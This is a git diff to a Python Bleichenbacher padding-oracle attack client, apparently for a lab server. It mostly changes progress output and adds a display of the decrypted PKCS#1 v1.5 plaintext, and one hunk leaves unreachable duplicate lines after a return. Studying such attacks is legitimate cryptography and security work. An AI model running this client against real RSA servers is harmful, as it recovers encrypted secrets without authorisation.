@@ -6,6 +6,7 @@ Implements a TLS client with Bleichenbacher padding oracle attack capabilities.
 
 import sys
 import time
+import shutil
 from typing import Any, Dict, List, Optional, Tuple
 
 import requests
@@ -29,6 +30,43 @@ class BleichenbacherClient:
         cipher_suite: Selected cipher suite (RSA with PKCS#1 v1.5 padding)
     """
 
+    @staticmethod
+    def format_pkcs_binary(data: bytes) -> str:
+        """
+        Format bytes to show PKCS#1 v1.5 structure in binary.
+        Shows: 0x00 0x02 ... 0x00 [message]
+
+        Args:
+            data: Bytes to format
+
+        Returns:
+            Formatted string showing PKCS structure
+        """
+        if len(data) < 3:
+            return ' '.join(f'{b:02x}' for b in data)
+
+        # Find the 0x00 separator after 0x00 0x02
+        try:
+            sep_index = data.index(b'\x00', 2)
+            # Show: 0x00 0x02 ... 0x00 [message bytes]
+            start = ' '.join(f'{b:02x}' for b in data[:2])  # 0x00 0x02
+            padding_len = sep_index - 2
+            sep = '00'
+            message = ' '.join(
+                f'{b:02x}' for b in data[sep_index+1:min(sep_index+21, len(data))])
+
+            result = f"{start} [{padding_len} padding bytes] {sep} {message}"
+            if len(data) > sep_index + 21:
+                result += " ..."
+            return result
+        except ValueError:
+            # No separator found, just show first few and last few bytes
+            if len(data) > 40:
+                start = ' '.join(f'{b:02x}' for b in data[:20])
+                end = ' '.join(f'{b:02x}' for b in data[-20:])
+                return f"{start} ... {end}"
+            return ' '.join(f'{b:02x}' for b in data)
+
     def __init__(self, server_host: str, server_port: int):
         """
         Initialize the Bleichenbacher attack client.
@@ -42,6 +80,7 @@ class BleichenbacherClient:
         self.base_url = f"http://{server_host}:{server_port}"
         self.session = requests.Session()
         self.server_public_key = None
+        self.last_progress_lines = 0  # Track number of lines used for progress output
         self.cipher_suite = "TLS_RSA_WITH_AES_128_CBC_SHA"  # Vulnerable to Bleichenbacher
         self.client_random = None
         self.server_random = None
@@ -144,6 +183,28 @@ class BleichenbacherClient:
         # Start the full attack
         return self._narrow_solution_space(ciphertext, s0=1)
 
+    def _clear_progress_lines(self):
+        """Clear previous progress output lines."""
+        if self.last_progress_lines > 0:
+            for _ in range(self.last_progress_lines):
+                sys.stdout.write('\033[F')  # Move cursor up
+                sys.stdout.write('\033[2K')  # Clear entire line
+            sys.stdout.flush()
+
+    def _write_progress(self, message: str):
+        """Write progress message and track number of lines used."""
+        # Clear previous output
+        self._clear_progress_lines()
+
+        # Write new message
+        sys.stdout.write(message)
+        sys.stdout.flush()
+
+        # Calculate number of lines used (assume 80 char terminal width as minimum)
+        terminal_width = shutil.get_terminal_size((80, 20)).columns
+        self.last_progress_lines = (
+            len(message) + terminal_width - 1) // terminal_width
+
     def _find_next_s(self, c: int, s_prev: int, M: List[Tuple[int, int]], n: int, e: int, k: int, B: int, iteration: int, start_time: float, oracle_queries: int) -> Tuple[Optional[int], int]:
         """
         Find the next s value that produces PKCS#1 v1.5 conformant message.
@@ -189,13 +250,10 @@ class BleichenbacherClient:
                         qps = total_queries / elapsed if elapsed > 0 else 0
                         width = b - a
                         width_bits = width.bit_length()
-                        # Format s to prevent overflow (show first 10 and last 10 digits)
-                        s_str = str(s)
-                        s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
-                            s_str) > 20 else s_str
-                        sys.stdout.write(
-                            f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: 2^{width_bits:<4} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
-                        sys.stdout.flush()
+                        # Show full interval start in hex
+                        interval_str = hex(a)
+                        message = f"[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: 2^{width_bits:<4} | Elapsed: {int(elapsed):>6}s | interval={interval_str}\n"
+                        self._write_progress(message)
 
                     # Test if this s value produces conforming message
                     if self._test_s_value(c, s, e, n, k):
@@ -203,13 +261,10 @@ class BleichenbacherClient:
                         qps = total_queries / elapsed if elapsed > 0 else 0
                         width = b - a
                         width_bits = width.bit_length()
-                        # Format s to prevent overflow (show first 10 and last 10 digits)
-                        s_str = str(s)
-                        s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
-                            s_str) > 20 else s_str
-                        sys.stdout.write(
-                            f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: 2^{width_bits:<4} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
-                        sys.stdout.flush()
+                        # Show full interval start in hex
+                        interval_str = hex(a)
+                        message = f"[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: 2^{width_bits:<4} | Elapsed: {int(elapsed):>6}s | interval={interval_str}\n"
+                        self._write_progress(message)
                         return s, queries_used
 
                 # Move to next r value
@@ -227,24 +282,20 @@ class BleichenbacherClient:
                 if queries_used % 10 == 0:
                     elapsed = time.time() - start_time
                     qps = total_queries / elapsed if elapsed > 0 else 0
-                    # Format s to prevent overflow (show first 10 and last 10 digits)
-                    s_str = str(s)
-                    s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
-                        s_str) > 20 else s_str
-                    sys.stdout.write(
-                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
-                    sys.stdout.flush()
+                    # Show full first interval start in hex
+                    interval_str = hex(M[0][0]) if M else "N/A"
+                    message = f"[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | interval={interval_str}\n"
+                    self._write_progress(message)
 
                 # Test if this s value produces conforming message
                 if self._test_s_value(c, s, e, n, k):
                     elapsed = time.time() - start_time
                     qps = total_queries / elapsed if elapsed > 0 else 0
-                    # Format s to prevent overflow (show first 10 and last 10 digits)
-                    s_str = str(s)
-                    s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
-                        s_str) > 20 else s_str
-                    sys.stdout.write(
-                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
+                    # Show full first interval start in hex
+                    interval_str = hex(M[0][0]) if M else "N/A"
+                    message = f"[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | interval={interval_str}\n"
+                    self._write_progress(message)
+                    return s, queries_used
                     sys.stdout.flush()
                     return s, queries_used
 
@@ -277,7 +328,7 @@ class BleichenbacherClient:
         s = s0
 
         print("[*] Starting interval narrowing (Bleichenbacher Step 2)")
-        print("[*] Initial interval: [2B, 3B-1] where B = 2^(8*(k-2))")
+        print(f"[*] Initial interval: [2B, 3B) where B = {hex(B)}")
         print("[*] Starting full-scale attack (this may take a while)...\n")
 
         oracle_queries = 1  # Already did one query to verify conformance
@@ -301,13 +352,13 @@ class BleichenbacherClient:
                 else:
                     width_str = "N/A"
 
-                # Format s to prevent overflow (show first 10 and last 10 digits)
-                s_str = str(s)
-                s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
-                    s_str) > 20 else s_str
-                sys.stdout.write(
-                    f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {width_str:<6} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
-                sys.stdout.flush()
+                # Show full interval start in hex
+                if len(intervals) > 0:
+                    interval_str = hex(intervals[0][0])
+                else:
+                    interval_str = "N/A"
+                message = f"[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {width_str:<6} | Elapsed: {int(elapsed):>6}s | interval={interval_str}\n"
+                self._write_progress(message)
 
                 # Step 2.c/3: Narrow the set of solutions based on current s
                 new_intervals = []
@@ -329,15 +380,19 @@ class BleichenbacherClient:
                 intervals = self._merge_intervals(new_intervals)
 
                 if not intervals:
+                    self._clear_progress_lines()
                     print("\n[-] No valid intervals remaining")
                     break
 
                 # Check if we have narrowed down to a single value
                 if len(intervals) == 1 and intervals[0][0] == intervals[0][1]:
+                    # Clear progress display
+                    self._clear_progress_lines()
+
                     plaintext_int = intervals[0][0]
                     elapsed = time.time() - start_time
                     print(
-                        "\n\n[+] Attack successful! Narrowed to single value!")
+                        "\n[+] Attack successful! Narrowed to single value!")
                     print(f"[+] Total iterations: {iteration}")
                     print(f"[+] Total oracle queries: {oracle_queries}")
                     print(
@@ -347,6 +402,8 @@ class BleichenbacherClient:
                         plaintext = plaintext_int.to_bytes(k, byteorder='big')
                         print(
                             f"[+] Decrypted plaintext (hex): {plaintext.hex()}")
+                        print(
+                            f"[+] Decrypted plaintext (split-up): {self.format_pkcs_binary(plaintext)}")
                         # Try to extract the actual message (after 0x00 0x02 padding)
                         try:
                             # Find the 0x00 separator after padding
@@ -365,12 +422,14 @@ class BleichenbacherClient:
                 next_s, queries_used = self._find_next_s(
                     c, s, intervals, n, e, k, B, iteration, start_time, oracle_queries)
                 if next_s is None:
+                    self._clear_progress_lines()
                     print("\n[-] Could not find next s value")
                     break
 
                 oracle_queries += queries_used
                 s = next_s
         except KeyboardInterrupt:
+            self._clear_progress_lines()
             print("\n\n[!] Attack interrupted by user")
             return None
 
